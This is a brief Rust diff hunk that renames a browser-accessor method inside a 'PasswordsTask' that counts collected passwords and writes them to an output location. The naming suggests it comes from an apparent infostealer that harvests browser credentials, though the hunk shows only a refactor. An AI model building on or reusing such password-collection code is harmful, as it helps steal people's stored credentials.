@@ -35,7 +35,7 @@ impl<C: Collector> Task<C> for PasswordsTask {
             return
         };
 
-        collector.browser().increase_passwords_by(passwords.len());
+        collector.get_browser().increase_passwords_by(passwords.len());
         let _ = to_string_and_write_all(&passwords, "\n\n", parent);
     }
 }
